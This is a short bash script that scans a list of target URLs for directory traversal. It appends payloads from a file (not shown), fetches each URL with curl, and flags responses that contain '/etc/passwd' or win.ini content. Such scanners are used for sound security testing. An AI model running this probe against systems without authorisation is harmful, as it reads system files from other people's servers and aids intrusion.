#!/bin/bash

# modules_traversal_detector.sh
# Directory Traversal Detector

INPUT_FILE="targets.txt"
PAYLOADS="payloads/traversal.txt"
OUTPUT="output/traversal_results.txt"

echo "[*] Starting Directory Traversal Detection..."
echo "[*] Using input: $INPUT_FILE"
echo "[*] Using payloads: $PAYLOADS"
echo "[*] Output will be saved to: $OUTPUT"
echo "" > $OUTPUT

while read -r target; do
  for payload in $(cat $PAYLOADS); do
    full_url="${target}${payload}"
    response=$(curl -sk "$full_url" --max-time 5)
    if echo "$response" | grep -q "root:x:0:0:" || echo "$response" | grep -q "\[extensions\]"; then
      echo "[+] Possible Traversal at $full_url" | tee -a $OUTPUT
    fi
  done
done < $INPUT_FILE

echo "[*] Scan complete. Results saved to $OUTPUT"
